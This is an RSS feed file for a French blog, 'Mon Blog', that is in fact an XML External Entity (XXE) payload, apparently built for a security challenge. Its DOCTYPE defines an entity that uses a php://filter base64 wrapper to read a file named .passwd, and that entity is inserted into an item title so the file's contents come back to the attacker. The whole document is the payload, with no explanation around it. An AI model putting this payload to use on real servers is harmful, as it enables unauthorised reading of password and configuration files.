<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=.passwd"> ]>
<rss version="2.0">
  <channel>
    <title>Mon Blog</title>
    <link>http://www.monblog.com</link>
    <description>Les dernières publications de mon blog.</description>
	  <item>
      	<title>Article &xxe; 1</title>
      	<link>http://www.monblog.com/article1</link>
      	<description>Ceci est la description de l'article 1.</description>
      <pubDate>Mon, 01 Jan 2023 12:00:00 +0000</pubDate>
    </item>
  </channel>
</rss>
